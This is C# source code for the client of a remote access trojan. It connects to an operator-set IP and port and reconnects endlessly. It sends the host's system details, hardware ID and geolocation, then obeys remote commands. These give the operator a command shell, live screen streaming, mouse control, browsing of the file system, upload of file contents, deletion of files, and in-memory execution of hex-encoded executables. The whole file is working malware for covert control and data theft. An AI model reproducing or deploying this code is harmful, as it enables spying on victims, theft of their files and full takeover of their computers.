using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Text;
using Newtonsoft.Json.Linq;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security;
using Newtonsoft.Json;

class program
{
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("shell32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

    [StructLayout(LayoutKind.Sequential)]
    public struct SHFILEINFO
    {
        public IntPtr hIcon;
        public IntPtr iIcon;
        public uint dwAttributes;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szDisplayName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
        public string szTypeName;
    }

    public const uint SHGFI_ICON = 0x000000100;
    public const uint SHGFI_SMALLICON = 0x000000001;


    static void videoThread(Socket socket, sysinfo objA)
    {
        while (GlobalVariables.video)
        {
            byte[] prefixBytes = Encoding.UTF8.GetBytes("video->");
            Bitmap screenshot = objA.CaptureScreen(GlobalVariables.monitor);
            byte[] bytes = objA.BitmapToBytes(screenshot, ImageFormat.Jpeg, GlobalVariables.quality);
            byte[] resultBytes = new byte[prefixBytes.Length + bytes.Length];
            Array.Copy(prefixBytes, 0, resultBytes, 0, prefixBytes.Length);
            Array.Copy(bytes, 0, resultBytes, prefixBytes.Length, bytes.Length);
            SendData(socket, resultBytes);
        }

    }
    static void HandleClient(Socket socket)
    {
        sysinfo objA = new sysinfo();
        while (true)
        {
            byte[] receivedData = recv(socket); // Assuming you have a working recv function
            Console.WriteLine(receivedData + "HandleClient");
            string receivedString = System.Text.Encoding.UTF8.GetString(receivedData);
            if (receivedString.StartsWith("start_cmd"))
            {
                if (!GlobalVariables.iscommand)
                {
                    Thread Command = new Thread(() => objA.StartInteractiveCommandPrompt(socket));
                    Command.Start();
                    GlobalVariables.iscommand = true;
                }


            }
            else if (receivedString.StartsWith("stream"))
            {
                if (!GlobalVariables.video)
                {
                    Thread myThread = new Thread(() => videoThread(socket, objA));
                    myThread.Start();
                    GlobalVariables.video = true;
                }
                else
                {
                    GlobalVariables.video = false;
                }
            }
            else if (receivedString.StartsWith("quality->"))
            {
                string[] quality = receivedString.Split(new[] { "quality->" }, StringSplitOptions.None);
                GlobalVariables.quality = int.Parse(quality[1]);
            }
            else if (receivedString.StartsWith("monitor->"))
            {
                string[] monitor = receivedString.Split(new[] { "monitor->" }, StringSplitOptions.None);
                GlobalVariables.monitor = int.Parse(monitor[1]);
            }
            else if (receivedString.StartsWith("cmd->"))
            {
                string[] cmd = receivedString.Split(new[] { "cmd->" }, StringSplitOptions.None);
                GlobalVariables.command = cmd[1];
            }
            else if (receivedString.StartsWith("mouse->"))
            {
                string[] mouse = receivedString.Split(new[] { "mouse->" }, StringSplitOptions.None);
                string[] cords = mouse[1].Split(new[] { " " }, StringSplitOptions.None);
                Console.WriteLine(cords[0] + " " + cords[1]);
                SetCursorPos(int.Parse(cords[0]), int.Parse(cords[1]));
            }
            else if (receivedString.StartsWith("executable->"))
            {

                string[] Execvalue = receivedString.Split(new[] { "executable->" }, StringSplitOptions.None);
                ExecMem(Execvalue[1]);
            }
            else if (receivedString.StartsWith("dir->"))
            {
                string[] Directory = receivedString.Split(new[] { "dir->" }, StringSplitOptions.None);
                try
                {
                    GetDir(Directory[1], socket);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    SendData(socket, Encoding.UTF8.GetBytes("FileError->" + "PERMISSION"));
                };
            }
            else if (receivedString.StartsWith("ReadFile->"))
            {
                string[] filename = receivedString.Split(new[] { "ReadFile->" }, StringSplitOptions.None);
                byte[] fileBytes = File.ReadAllBytes(filename[1]);
                byte[] messageBytes = Encoding.UTF8.GetBytes("File->");
                byte[] combinedBytes = new byte[messageBytes.Length + fileBytes.Length];
                Array.Copy(messageBytes, combinedBytes, messageBytes.Length);
                Array.Copy(fileBytes, 0, combinedBytes, messageBytes.Length, fileBytes.Length);

                SendData(socket, combinedBytes);
            }
            else if (receivedString.StartsWith("delete->"))
            {
                string[] filename = receivedString.Split(new[] { "delete->" }, StringSplitOptions.None);
                if (File.Exists(filename[1]))
                {
                    File.Delete(filename[1]);
                }
            }
        }

    }

    static byte[] recv(Socket socket)
    {
        byte[] data = new byte[0];
        byte[] lengthBytes = new byte[0];

        while (true)
        {
            byte[] packetLenBytes = new byte[1];
            int bytesRead = socket.Receive(packetLenBytes);

            if (bytesRead == 0 || packetLenBytes[0] == (byte)' ')
            {
                break;
            }

            lengthBytes = CombineArrays(lengthBytes, packetLenBytes);
        }

        int length = int.Parse(System.Text.Encoding.UTF8.GetString(lengthBytes));

        while (data.Length < length)
        {
            byte[] packet = new byte[length - data.Length];
            int bytesRead = socket.Receive(packet);

            if (bytesRead == 0)
            {
                return null; // Connection closed or error occurred
            }

            data = CombineArrays(data, packet);
        }

        return data;
    }

    static byte[] CombineArrays(byte[] first, byte[] second)
    {
        byte[] combined = new byte[first.Length + second.Length];
        Buffer.BlockCopy(first, 0, combined, 0, first.Length);
        Buffer.BlockCopy(second, 0, combined, first.Length, second.Length);
        return combined;
    }
    static void ExecMem(string hexBytecode)
    {
        byte[] bin = ParseHexadecimalString(hexBytecode);
        ProjectorPE.Run(bin);

    }
    static byte[] ParseHexadecimalString(string hexString)
    {
        int numberChars = hexString.Length;
        byte[] bytes = new byte[numberChars / 2];
        for (int i = 0; i < numberChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
        }
        return bytes;
    }
    public static void SendData(Socket socket, byte[] dataBytes)
    {
        try
        {
            // Send the length of the data as a prefix
            byte[] lengthBytes = Encoding.UTF8.GetBytes(dataBytes.Length.ToString());
            byte[] combinedBytes = new byte[lengthBytes.Length + 1 + dataBytes.Length];
            lengthBytes.CopyTo(combinedBytes, 0);
            combinedBytes[lengthBytes.Length] = (byte)' ';
            dataBytes.CopyTo(combinedBytes, lengthBytes.Length + 1);

            // Send the combined data over the socket
            socket.Send(combinedBytes);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to send data: {ex.Message}");
        }
    }

    static void GetDir(string currentDirectory, Socket socket)
    {
        if (currentDirectory == "Unknown")
        {
            currentDirectory = Directory.GetCurrentDirectory();
        }

        if (!Directory.Exists(currentDirectory) && !File.Exists(currentDirectory))
        {
            byte[] errorData = Encoding.UTF8.GetBytes("FileError->" + "ERROR");
            SendData(socket, errorData);
            return;
        }

        List<object> itemsObject = new List<object>();
        foreach (var item in Directory.EnumerateFileSystemEntries(currentDirectory))
        {
            bool isDirectory = (File.GetAttributes(item) & FileAttributes.Directory) == FileAttributes.Directory;
            string itemType = isDirectory ? "Folder" : "File";

            IntPtr hIcon;
            try
            {
                hIcon = GetFileIcon(item, isDirectory);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine($"Error getting icon for {item}: {ex.Message}");
                // Handle the error and continue
                continue;
            }

            itemsObject.Add(new
            {
                Name = Path.GetFileName(item),
                Type = itemType,
                IconBase64 = IconToBase64(hIcon)
            });
        }

        var newItem = new { Extension = currentDirectory, Name = "CWD" };
        itemsObject.Add(newItem);

        string updatedItemsJson = JsonConvert.SerializeObject(itemsObject);

        string data = "Files->" + updatedItemsJson;
        byte[] directory = Encoding.UTF8.GetBytes(data);
        Console.WriteLine("SENDING" + directory);
        SendData(socket, directory);
    }

    // Retrieve the icon for a file or folder
    /*    private static IntPtr GetFileIcon(string path, bool isDirectory)
        {
            SHFILEINFO shinfo = new SHFILEINFO();
            uint flags = SHGFI_ICON | (isDirectory ? SHGFI_SMALLICON : SHGFI_LARGEICON);
            SHGetFileInfo(path, isDirectory ? FILE_ATTRIBUTE_DIRECTORY : 0, ref shinfo, (uint)Marshal.SizeOf(shinfo), flags);
            return shinfo.hIcon;
        }*/
    static IntPtr GetFileIcon(string item, bool isDirectory)
    {
        IntPtr hIcon;
        if (isDirectory)
        {
            hIcon = GetFolderIcon().Handle;
        }
        else
        {
            hIcon = Icon.ExtractAssociatedIcon(item).Handle;
        }
        return hIcon;
    }

    static Icon GetFolderIcon()
    {
        SHFILEINFO shinfo = new SHFILEINFO();
        IntPtr hImgSmall = SHGetFileInfo("", 0, ref shinfo, (uint)Marshal.SizeOf(shinfo), SHGFI_ICON | SHGFI_SMALLICON);
        return Icon.FromHandle(shinfo.hIcon);
    }



    // Convert an icon to a Base64 string
    private static string IconToBase64(IntPtr hIcon)
    {
        using (Icon icon = Icon.FromHandle(hIcon))
        {
            using (MemoryStream ms = new MemoryStream())
            {
                icon.ToBitmap().Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                byte[] iconBytes = ms.ToArray();
                return Convert.ToBase64String(iconBytes);
            }
        }
    }

    static void start_client()
    {
        string contents = "                                                                                                                                                                                                                                                                ";
        string[] details = contents.Split(' ');
        string[] userinfo = details[0].Split(':');
        string ip = userinfo[0];
        int port = int.Parse(userinfo[1]);
        using (Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
        {
            try
            {
                // Replace 'ServerIpAddress' and 'ServerPort' with the server's address and port
                clientSocket.Connect(ip, port);

                byte[] receivedData = recv(clientSocket);
                if (receivedData != null)
                {
                    string receivedString = System.Text.Encoding.UTF8.GetString(receivedData);
                    Console.WriteLine(receivedString);
                }
                else
                {
                    Console.WriteLine("Error: Received data is null or connection closed.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
            sysinfo objA = new sysinfo();

            string GetGpuName = objA.get_contents("wmic path win32_videocontroller get caption", 1);
            Console.WriteLine(GetGpuName);
            string GetCpuName = objA.get_contents("wmic cpu get name", 1);
            Console.WriteLine(GetCpuName);

            string[] keywords = { "System Locale", "Host Name", "OS Name", "OS Version" };
            Dictionary<string, string> systemInfo = objA.GetSystemInfo(keywords);
            string hwid = objA.get_contents("reg query HKEY_USERS", 4);
            // Make a web request to https://api.myip.com
            string location = objA.get_contents("curl -s https://api.myip.com", 0);
            JObject locationJson = JObject.Parse(location);
            // Create JSON objects for both system information and location
            List<Dictionary<string, object>> screenInfo = objA.GetScreenInfo();
            // Convert the screenInfo list to JSON
            string Display_info = Newtonsoft.Json.JsonConvert.SerializeObject(screenInfo, Newtonsoft.Json.Formatting.Indented);

            var jsonResult = new Dictionary<string, object>

            {
                { "DISPLAY", Display_info },
                { "SYSINFO", systemInfo },
                { "LOCATION", locationJson},
                { "HWID", hwid.Substring(11,40) },
                { "CPU",  GetCpuName},
                { "GPU", GetGpuName }
            };

            Console.WriteLine(jsonResult);
            // Serialize the entire JSON result
            string json = Newtonsoft.Json.JsonConvert.SerializeObject(jsonResult, Newtonsoft.Json.Formatting.Indented);
            byte[] data = Encoding.UTF8.GetBytes(json);
            SendData(clientSocket, data);
            HandleClient(clientSocket);
        }
    }
    static void ExecuteMain()
    {
        do
        {
            try
            {
                GlobalVariables.iscommand = false;
                GlobalVariables.video = false;
                GlobalVariables.quality = 20;
                GlobalVariables.monitor = 0;
                GlobalVariables.command = "";
                start_client();
            }
            catch (Exception ex) { Console.WriteLine(ex.Message); }
            Thread.Sleep(2000);

        } while (true);
    }
    static void Main()
    {
        ExecuteMain();
    }
}
